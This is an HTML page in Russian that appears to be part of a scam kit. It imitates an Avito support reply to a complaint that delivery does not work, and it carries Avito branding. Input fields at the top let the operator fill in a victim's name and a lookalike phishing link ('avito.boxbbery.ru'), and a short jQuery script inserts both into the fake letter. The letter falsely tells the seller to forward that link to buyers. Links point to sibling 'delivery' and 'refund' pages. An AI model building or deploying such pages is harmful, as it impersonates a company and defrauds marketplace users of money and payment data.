

<!DOCTYPE html>
<html lang="ru" prefix="og: http://ogp.me/ns#">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="fragment" content="!">
	<title>Обращение в поддержку Авито</title>
	<script src="assets/jquery-3.4.1.min.js"></script>
	<link rel="shortcut icon" type="image/x-icon" href="https://support.avito.ru/static/icons/favicon.ico">
	<link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://support.avito.ru/static/icons/apple-touch-icon-180x180-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://support.avito.ru/static/icons/apple-touch-icon-152x152-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://support.avito.ru/static/icons/apple-touch-icon-144x144-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://support.avito.ru/static/icons/apple-touch-icon-120x120-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://support.avito.ru/static/icons/apple-touch-icon-114x114-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://support.avito.ru/static/icons/apple-touch-icon-76x76-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://support.avito.ru/static/icons/apple-touch-icon-72x72-precomposed.png">
	<link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://support.avito.ru/static/icons/apple-touch-icon-57x57-precomposed.png">
	<link rel="stylesheet" href="assets/main.css"> </head>
<body>
	<center>
		<input style="width:10%;" value="Роман" class="n1">
		<input style="width:10%;" value="https://avito.boxbbery.ru/" class="n2">
		<a href="avito-delivery.php">AVITO ДОСТАВКА</a> |  <a href="avito-refund.php">AVITO ВОЗВРАТ</a>
	</center>
	<div id="app">
		<div class="QoVrv3jV9zZUD7CwMa9il">
			<header class="_2pmaZjSPgis0Uz9Grj-yA1" id="js-header" data-marker="header">
				<div class="_14-32YQVew6NHNeq6t-sWG _3M6viLIlbz80kWH8-mfIU5">
					<div class="_1n7RFRbZdUZAoifLlClTn5 _1MLR10V_Gt-NByqXDKIKTi">
						<div class="_1NJxuK8kTDDEm93yiGc16b">
							<div class="_3T5C-tYne_P3vZoAUynac4">
								<a href="https://avito.ru" aria-label="Авито помощь" data-marker="logo" target="_blank" class="_39EVKDP-9p1BREJQ3fhILl _2sPEvPi-1aWpcq1ggVph1C _4wLX_6jxKYoWRyE1U1WcZ">
									<svg width="30" height="31" viewBox="0 0 30 31" xmlns="http://www.w3.org/2000/svg">
										<g fill="none" fill-rule="nonzero">
											<ellipse fill="#97CF26" cx="21.018" cy="22.188" rx="8.018" ry="8.188"></ellipse>
											<ellipse fill="#A169F7" cx="5.732" cy="22.811" rx="3.732" ry="3.811"></ellipse>
											<ellipse fill="#FF6163" cx="21.161" cy="7.27" rx="5.161" ry="5.27"></ellipse>
											<ellipse fill="#0AF" cx="6.589" cy="6.729" rx="6.589" ry="6.729"></ellipse>
										</g>
									</svg>
									<svg class="_1kh_ECrYohicRIXeyL20hT" width="69" height="31" viewBox="0 0 69 31" xmlns="http://www.w3.org/2000/svg">
										<path d="M14.524 26.214l-7.48-7.316h4.847l-2.422-6.74-2.425 6.74 7.48 7.317-1.472-4.09H5.885l-1.473 4.09H.25L7.96 4.78h3.017l7.71 21.434h-4.163zm14.48-14.632h3.909l-5.265 14.632h-4.95l-5.264-14.632h3.91l3.83 10.647 3.83-10.648zm5.545 0h3.91v14.632h-3.91V11.582zm1.968-1.662C35.128 9.92 34 8.77 34 7.35s1.127-2.572 2.518-2.572c1.39 0 2.518 1.15 2.518 2.57S37.908 9.92 36.518 9.92zm15.75 4.886h-4.685v6.05c0 1.638 1.334 2.148 2.494 2.148.946 0 1.716-.235 1.716-.235l.475 3.16s-1.375.587-2.943.587c-4.06 0-5.65-2.168-5.65-5.415v-6.296h-3.093v-3.224h3.093V7.545h3.908v4.037h4.685v3.224zm1.292 4.068c0-4.232 3.437-7.666 7.675-7.666 4.237 0 7.674 3.434 7.674 7.666 0 4.234-3.438 7.666-7.675 7.666-4.238 0-7.675-3.432-7.675-7.666zm3.73.053c0 2.177 1.765 3.943 3.946 3.943 2.18 0 3.946-1.765 3.946-3.942 0-2.176-1.766-3.942-3.947-3.942-2.18 0-3.946 1.766-3.946 3.94z" fill="#000" fill-rule="nonzero"></path>
									</svg>
									<svg class="_2IhoZesjFLOPaEddXzTT9f" width="92" height="31" viewBox="0 0 92 31" xmlns="http://www.w3.org/2000/svg">
										<path d="M11.5 26H9.762V13.51h-7.54V26H.456V11.908H11.5V26zm9.238-14.326c2 0 3.58.654 4.746 1.963 1.166 1.308 1.748 3.082 1.748 5.322 0 2.232-.582 4.003-1.748 5.31-1.165 1.31-2.747 1.964-4.746 1.964-1.998 0-3.58-.654-4.746-1.963-1.165-1.307-1.748-3.078-1.748-5.31 0-2.24.583-4.015 1.748-5.323 1.166-1.31 2.748-1.963 4.746-1.963zm0 1.62c-1.44 0-2.58.51-3.423 1.53-.843 1.018-1.264 2.397-1.264 4.135 0 1.73.422 3.106 1.265 4.125.844 1.02 1.984 1.528 3.423 1.528 1.44 0 2.58-.51 3.423-1.528.844-1.02 1.266-2.394 1.266-4.126 0-1.74-.422-3.118-1.265-4.137-.842-1.02-1.983-1.528-3.422-1.528zM43.863 26h-1.64V15.14h-.07l-4.49 10.762h-1.485l-4.492-10.76h-.07V26h-1.64V11.908h2.042l4.863 11.758h.08l4.862-11.758h2.04V26zm9.24-14.326c1.997 0 3.58.654 4.745 1.963 1.165 1.308 1.748 3.082 1.748 5.322 0 2.232-.583 4.003-1.748 5.31-1.166 1.31-2.748 1.964-4.746 1.964-2 0-3.58-.654-4.747-1.963-1.165-1.307-1.748-3.078-1.748-5.31 0-2.24.583-4.015 1.748-5.323 1.166-1.31 2.748-1.963 4.747-1.963zm0 1.62c-1.44 0-2.58.51-3.424 1.53-.844 1.018-1.266 2.397-1.266 4.135 0 1.73.422 3.106 1.265 4.125.842 1.02 1.983 1.528 3.422 1.528 1.438 0 2.58-.51 3.422-1.528.844-1.02 1.265-2.394 1.265-4.126 0-1.74-.422-3.118-1.266-4.137-.843-1.02-1.984-1.528-3.422-1.528zm26.463 15.49h-1.63V26H62.34V11.908h1.758v12.51h5.097v-12.51h1.758v12.51h5.098v-12.51h1.76v12.51h1.756v4.365zM81.98 26V11.908h1.756v5.225h3.448c1.328 0 2.415.415 3.26 1.245.848.83 1.27 1.896 1.27 3.198 0 1.296-.42 2.357-1.26 3.184-.84.827-1.923 1.24-3.25 1.24h-5.225zm1.756-1.582h3.008c1.01 0 1.79-.247 2.34-.742.55-.495.824-1.195.824-2.1 0-.91-.275-1.616-.825-2.114-.55-.498-1.33-.747-2.34-.747h-3.007v5.703z" fill="#A8A8A8"></path>
									</svg>
								</a>
							</div>
							<div class="_1Dg6rh1GnUE4AlYqBodyxi">
								<div class="_1sVcoq3409YuobI1t0li3Y"></div>
							</div>
						</div>
						<div class="_1RS4JUOE1Nsv_hqhMTY3-q">
							<div class="_1A8KE-YnD7nFfALDR64Nag">
								<form role="search" action="https://avito.ru" class="_12yI-fubv3oEtbmmbeuuWO" data-marker="search">
									<div class="_2E7MdK11Lyp9JKo9f-DAHV we2eiv8k2m5nCk_t7MJuL">
										<label class="eKhsIjHDqJDhXhym_-N8c _1G8d45HkubTbReomNs9Atu IDAPR0Cti70sgR8q1p2sB _2VZLzd5HCQiLe3dSfLYdJT">
											<input name="query" placeholder="Найти ответ" data-marker="search/input" autocomplete="off" type="text" class="_25uChdOmZN8JUbG9VIa01n" value="">
										</label>
									</div>
									<button type="submit" data-marker="search/submit" class="_2mlaNfMhb7bRq5B_f3LUqZ _2Fo5kcZJfHF2Gp5elWxam2 _3-rn6nj8V2ojAEk4vyVjWO _1RhOGTVxC-Cyrp7B_opKc_" aria-busy="false"><span class="Row9KDxnUQvSV_OihILJX">Найти</span></button>
								</form>
							</div>
						</div>
					</div>
				</div>
			</header>
			<main class="_3813iTvlPXSvPZQT-D0AhH">
				<div class="_2CGzLjMbThgpfp9vqpldGf" role="region" tabindex="-1" aria-label="Содержимое текущей страницы">
					<div class="_1MLR10V_Gt-NByqXDKIKTi">
						<div class="_1e9qYCYUrqoqyJODm0PUGH" data-marker="successful-request">
							<div class="_3s5LDvZKdmZSyLnUlVBq8X">
								<div class="_3x6YOH9ipPPRelqXX6MZRC _6O_PaRmyq43ygQVpHfQPa" data-marker="successful-request/icon"></div>
							</div>
							<div class="_21Ovy5SDt8aiKNpQ7sQPFF" data-marker="successful-request/content" style="width:900px;">
								<h1 data-marker="successful-request/title" class="fzMN7VZITBo_7wNrIso09 _3UK0dgK-C7plH1ASkFzOWc _2wnVYFtBfnCIS6vYpA4nkO"><span>Ответ на обращение «Не работает доставка Авито»</span></h1>
								<div data-marker="successful-request/annotation" class="_1PdBw9sWf98X7lQnOh-o6v _4mxHNViyBs2BvXWsdajPq">
									<p>Здравствуйте, <a class="lel">Роман</a>.
										<br>
										<br> Мы рассмотрели Вашу жалобу и вынуждены сообщить, что на данный момент услуга «Авито Доставка» для вас будет работать в ручном режиме, это связано с техническими неполадками на нашем сервере.
										<br>
										<br> Наши специалисты уже извещены о данной проблеме и проводят работы по восстановлению функционала.
										<br>
										<br> Чтобы воспользоваться функцией «Авито Доставка» вам необходимо скопировать ссылку ниже и передать её покупателю для оформления заказа.
										<br>
										<br> Ваша ссылка: <a href="https://avito.ru" class="lel2" target="_blank">https://avito.boxbbery.ru/</a>
										<br>
										<br> Приносим извинения за доставленные неудобства. </p>
									<hr> С уважением, Команда Авито
									<p></p>
								</div>
								<div class="_1mPGziiG7w8SS7CfqzNcYG"><a href="https://avito.ru" data-marker="successful-request/button" target="_blank" class="ckpmqH7WwRnQkUCi3ZTBw _2Fo5kcZJfHF2Gp5elWxam2 _7jtw4CfnHBnIQyvmMERb5 _1RhOGTVxC-Cyrp7B_opKc_">Вернуться назад</a></div>
							</div>
						</div>
					</div>
				</div>
			</main>
			<footer class="_39628dTrImEjc4gprbsau7 _1MLR10V_Gt-NByqXDKIKTi" data-marker="footer">
				<p class="rOpUWpbXiU4S--Nv5uSMi _3xDU2CwMLp6ST1ZKYFiziG">Авито — сайт объявлений <a href="https://avito.ru" target="_blank" rel="noopener noreferrer" class="_39EVKDP-9p1BREJQ3fhILl _3KR5L5sp4fVVlABZ501HF- _1HyIHhquitUhHzEb-SGrax">России</a>. © ООО «КЕХ еКоммерц» 2007–2020. <a href="https://avito.ru" target="_blank" class="_39EVKDP-9p1BREJQ3fhILl _3KR5L5sp4fVVlABZ501HF- _1HyIHhquitUhHzEb-SGrax">Условия использования Авито</a>. <a href="https://avito.ru" target="_blank" rel="noopener noreferrer" class="_39EVKDP-9p1BREJQ3fhILl _3KR5L5sp4fVVlABZ501HF- _1HyIHhquitUhHzEb-SGrax">Политика о данных пользователей</a>.</p>
			</footer>
			<div class="fGilRQQQJxuO9sCJmV1M _3sEdfMpoq-w7GgSuC37W8k">
				<div class="jKtKdYPKYALqWEMgq4uIX">
					<div role="alert"></div>
					<div role="alert"></div>
					<div role="alert"></div>
					<div role="alert"></div>
					<div role="alert"></div>
					<div role="alert"></div>
				</div>
			</div>
		</div>
	</div>
	<script>
	$('.n1').on('input', function(e) {
		$('.lel').html($('.n1').val());
	});
	$('.n2').on('input', function(e) {
		$('.lel2').html($('.n2').val());
	});
	</script>
</body>
</html>